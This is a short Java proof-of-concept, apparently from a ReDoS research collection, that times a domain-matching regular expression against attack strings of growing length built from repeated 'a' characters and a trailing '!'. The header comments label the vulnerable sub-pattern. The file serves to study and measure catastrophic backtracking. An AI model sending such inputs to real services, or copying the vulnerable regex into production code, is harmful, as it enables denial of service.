//vuln pattern: SLQ
//vuln degree: POL
//mul vuln: N
//vuln location: [\d\w\-.]+

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Demo {

    public static void main(String[] args) throws InterruptedException {
        String regex = "([\\d\\w\\-.]+?\\.(a[cdefgilmnoqrstuwz]|b[abdefghijmnorstvwyz]|c[acdfghiklmnoruvxyz]|d[ejkmnoz]|e[ceghrst]|f[ijkmnor]|g[abdefghilmnpqrstuwy]|h[kmnrtu]|i[delmnoqrst]|j[emop]|k[eghimnprwyz]|l[abcikrstuvy]|m[acdghklmnopqrstuvwxyz]|n[acefgilopruz]|om|p[aefghklmnrstwy]|qa|r[eouw]|s[abcdeghijklmnortuvyz]|t[cdfghjkmnoprtvwz]|u[augkmsyz]|v[aceginu]|w[fs]|y[etu]|z[amw]|aero|arpa|biz|com|coop|edu|info|int|gov|mil|museum|name|net|org|pro)(\\b|\\W(?<!&|=)(?!\\.\\s|\\.{3}).*?))(\\s|$)";
        for (int i = 0; i < 1000; i++) {
            StringBuilder attackString = new StringBuilder();
            // 前缀
            attackString.append("");
            // 歧义点
            for (int j = 0; j < i * 10000; j++) {
                attackString.append("a");
            }
            // 后缀
            attackString.append("!");
            long time1 = System.nanoTime();
            Matcher matcher = Pattern.compile(regex).matcher(attackString);
            boolean isMatch = matcher.find();
//            boolean isMatch = Pattern.matches(regex, attackString);
            long time2 = System.nanoTime();
            System.out.println(attackString.length() + " " + isMatch + " "+ (time2 - time1)/1e9+"s");

        }
    }







}
